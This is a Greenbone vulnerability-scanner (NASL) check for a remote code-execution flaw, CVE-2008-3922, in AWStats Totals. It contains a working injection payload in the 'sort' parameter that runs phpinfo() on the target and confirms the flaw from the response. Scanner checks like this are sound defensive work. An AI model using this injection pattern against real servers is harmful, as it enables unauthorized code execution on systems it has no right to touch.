# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801893");
  script_version("2024-06-28T05:05:33+0000");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_cve_id("CVE-2008-3922");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("AWStats Totals 'sort' Parameter RCE Vulnerabilities");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/44712");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/30856");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17324/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/495770/100/0/threaded");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101698/awstatstotals_multisort.rb.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to execute arbitrary PHP
  commands by constructing specially crafted 'sort' parameters.");

  script_tag(name:"affected", value:"AWStats Totals versions 1.14 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input passed via
  the 'sort' parameter to 'multisort()' function, which allows attackers to execute arbitrary PHP code.");

  script_tag(name:"solution", value:"Upgrade to AWStats Totals version 1.15 or later.");

  script_tag(name:"summary", value:"AWStats Totals is prone to remote command execution vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list_unique("/awstatstotals", "/awstats", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/awstatstotals.php", port:port);
  if("<title>AWStats Totals</title>" >< res)
  {
    url = string(dir, '/awstatstotals.php?sort="].phpinfo().exit().%24a["');

    if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<',
       extra_check: make_list('>System <', '>Configuration<', '>PHP Core<')))
    {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
